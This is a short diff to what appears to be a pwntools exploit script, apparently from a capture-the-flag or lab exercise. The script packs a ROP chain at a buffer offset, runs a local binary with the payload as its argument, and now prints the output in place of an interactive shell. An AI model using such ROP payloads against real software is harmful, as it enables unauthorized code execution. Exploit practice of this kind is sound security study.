@@ -21,6 +21,7 @@ offset = ...
 
 ########################################
 
+# pack ropchain at offset
 payload = flat({
     offset: rop.chain()
 })
@@ -28,6 +29,8 @@ payload = flat({
 print("ropchain:")
 print(rop.dump())
 
+# start the process
 with elf.process([payload]) as p:
-    p.interactive()
+	# print the output
+	print(p.recvrepeat(5).decode('utf-8').strip())
 
